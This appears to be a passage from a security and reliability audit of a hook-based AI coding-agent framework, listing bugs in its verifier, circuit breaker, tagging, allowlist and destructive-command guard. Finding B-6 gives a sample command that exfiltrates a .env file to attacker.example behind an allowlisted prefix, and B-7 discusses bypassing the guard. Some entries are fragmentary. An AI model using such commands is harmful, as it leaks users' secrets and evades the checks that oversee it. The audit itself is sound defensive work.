### A-7 `verifier.md` mixes epoch and date formats in the Rendering Gap check
**Severity:** P2
**Location:** [framework/agents/verifier.md:12-13](framework/agents/verifier.md#L12-L13)
**Claim:** Baseline = `PLAN_META.json created_at` OR `stat -c %Y .apex/phases/$PHASE/PLAN_META.json`. Then `git log --oneline --since="$baseline" -- . | wc -l`.
**Reality:** `stat -c %Y` returns epoch seconds (integer). `git log --since=` accepts ISO dates, relative expressions, or `@<epoch>` — plain integer is ambiguous and may be interpreted as year `1970.+epoch` formatting depending on version. **Impact:** Phase-level "Rendering Gap" check fails to work reliably: either parses wrong date and skips all commits (false pass), or errors and falls through. On macOS, `stat -c` fails outright.
**Fix complexity:** small

### A-8 `circuit-breaker.sh` no-change detection hashes empty git output as constant
**Severity:** P2 (needs investigation)
**Location:** [framework/hooks/circuit-breaker.sh:16](framework/hooks/circuit-breaker.sh#L16)
**Claim:** Detect "consecutive actions without file changes" by hashing `git diff HEAD --stat`.
**Reality:** Line 16: `CURRENT_HASH=$(git diff HEAD --stat 2>/dev/null | md5sum | cut -d' ' -f1)`. If git errors (non-git dir, corrupted repo), stderr is silenced and stdout is empty → `md5sum` of empty input → `d41d8cd98f00b204e9800998ecf8427e` (the well-known empty-string MD5). **Impact:** Misattributed alarms. Users see "stuck in loop" when the actual problem is "git missing". Troubleshooting path is wrong.
**Fix complexity:** trivial

## Category B — Silent Degradation

### B-1 `phase-tag.sh` exits 0 on tag creation failure — rollback silently unavailable
**Severity:** P1
**Location:** [framework/hooks/phase-tag.sh:17-32](framework/hooks/phase-tag.sh#L17-L32)
**Claim:** File docstring line 3: "Creates git tag for completed phase, enabling rollback". Orchestrator in next.md line 440 and verifier.md line 46 depends on this.
**Reality:** Line 17 runs `git tag -a ... 2>/dev/null` (stderr hidden). Line 19 checks `$?` and on failure prints "⚠️ Failed to create tag... (not in git repo?)". Line 32 unconditional `exit 0`. Orchestrator sees exit 0 and advances to the next phase, assuming the tag exists for rollback.
**Impact:** If git tagging fails (permissions, detached HEAD, clone without tags enabled, etc.), the rollback guarantee is silently broken. Users who later try `git revert ...apex/phase-N-complete` will discover the tag was never created.
**Fix complexity:** trivial

### B-2 `verify-learnings.sh` placeholder-detection pattern is broken — template examples reported as stale
**Severity:** P1
**Location:** [framework/hooks/verify-learnings.sh:75](framework/hooks/verify-learnings.sh#L75)
**Claim:** "Skip template/example citations (contain placeholder text)"
**Reality:** Pattern is `[[ "$FILE" == *"project-"* ]] || [[ "$FILE" == *"[" ]]`. The second check matches FILEs that **end with `[`**. But real placeholders in citation strings look like `[path]` which ends with `]`, not `[`. The pattern never matches the actual placeholder format. When the learnings file contains a template example like `**Citation:** [path]:42`, `$FILE` becomes `[path]`, which doesn't end with `[`, so it's treated as a real path, `[ ! -f "[path]" ]` is true, and the hook prints "⚠️ STALE CITATION: [path] (file not found)".
**Impact:** Every HOT/WARM section template comment (there are currently 2 in apex-learnings.md) will produce false "stale citation" warnings on every SessionStart (since verify-learnings runs there). Noise erodes trust in the warning.
**Fix complexity:** trivial

**Severity:** P1
**Location:** [~/.claude/settings.json:92](file:///C:/Users/%D7%93%D7%95%D7%93%D7%90%D7%9C%D7%9E%D7%95%D7%A2%D7%9C%D7%9D/.claude/settings.json#L92)

If the script errors — missing learnings file, permissions, syntax error — the user sees nothing. This is the exact anti-pattern Round 2 was supposed to end.
**Impact:** Any regression in verify-learnings.sh (e.g., the B-2 placeholder bug, or the date -d GNU-only bug) is completely invisible at runtime. The user has no way of knowing the learnings validator is broken.
**Fix complexity:** trivial

### B-6 `cross-phase-audit.sh` runs arbitrary bash from PLAN_META.json through `bash -c`
**Severity:** P2
**Location:** [framework/hooks/cross-phase-audit.sh:50](framework/hooks/cross-phase-audit.sh#L50)
**Claim:** "Security: validate command prefix against allowlist" (line 43)
**Reality:** Allowlist checks only the **first word** of each verify_command. Line 50 then runs `bash -c "$cmd" 2>&1` — full shell interpretation, including pipes, `&&`, subshells, and command substitution. A command like `npm run test-security && curl http://attacker.example/exfil -d "$(cat .env)"` passes the first-word allowlist (`npm`) and executes fully. Also: destructive-guard.sh only applies to Claude Code's Bash tool, NOT to bash subprocesses spawned from hooks — so `rm -rf /tmp/something` in a verify_command is not intercepted.
**Impact:** Any agent that writes PLAN_META.json is effectively an RCE primitive against the user's machine. Not a current exploit (agents are trusted), but the allowlist creates a false sense of defense-in-depth.
**Fix complexity:** medium

### B-7 `destructive-guard.sh` naive segment splitting can false-positive on piped commands with strings
**Severity:** P2
**Location:** [framework/hooks/destructive-guard.sh:106](framework/hooks/destructive-guard.sh#L106)
**Claim:** "v7: Split on &&, ;, and | — check each segment independently. This prevents bypass via: innocent_cmd && rm -rf /"
**Reality:** The split is textual: `sed 's/&&/\n/g; s/;/\n/g; s/|/\n/g'`. It doesn't respect quoted strings. A command like `echo "a | b"` becomes two segments: `echo "a` and `b"`. Neither matches destructive patterns (which start with `^rm` etc.), so no false block here — but a command like `grep "DROP TABLE" file.log` splits into one segment containing `grep "DROP TABLE" file.log`, which matches the SQL DROP pattern on line 45 and gets blocked even though grep is read-only.
**Impact:** Legitimate commands involving strings with dangerous keywords can be blocked. Users encountering this may work around destructive-guard via the manual terminal (per its own error message), which is exactly the escape hatch that erodes the guard's authority over time.
**Fix complexity:** medium

**Fix complexity:** small (either guard bc or replace with bash integer math)

### G-3 `rg` (ripgrep) unguarded in `generate-task-map.sh`
**Severity:** P2
**Location:** [framework/hooks/generate-task-map.sh:48](framework/hooks/generate-task-map.sh#L48)
**Claim:** "Related Files (keyword search)" block in TASK_MAP.md.
**Reality:** `RELATED=$(rg -l "$KEYWORDS" src/ lib/ app/ 2>/dev/null | ...)`. If rg is missing, output is empty, and the "Related Files" section of the task map is omitted. No error, no warning. Combined with B-9, the executor gets a degraded map and doesn't know why.
**Impact:** TDAD benefit diminishes when rg is missing. Behavior is not observably different from the "no related files found" case.
**Fix complexity:** trivial

### G-4 `post-write.sh` assumes `npx tsc` and a valid `tsconfig.json` for any .ts edit
**Severity:** P2
**Location:** [framework/hooks/post-write.sh:4-5](framework/hooks/post-write.sh#L4-L5)
**Claim:** Typecheck .ts files on write.
**Reality:** No guard for npx/tsc availability, no check for tsconfig.json, no scoping to "is this a TS project". In a project that happens to have a .ts file but no tsconfig, `npx tsc` errors, output goes to the pipe, first 5 lines printed, exit 0 (see A-3). Combined with A-3, the whole typecheck path is a no-op in practice on misconfigured projects, but it's loudly attempting npx tsc on every .ts edit.
**Fix complexity:** small
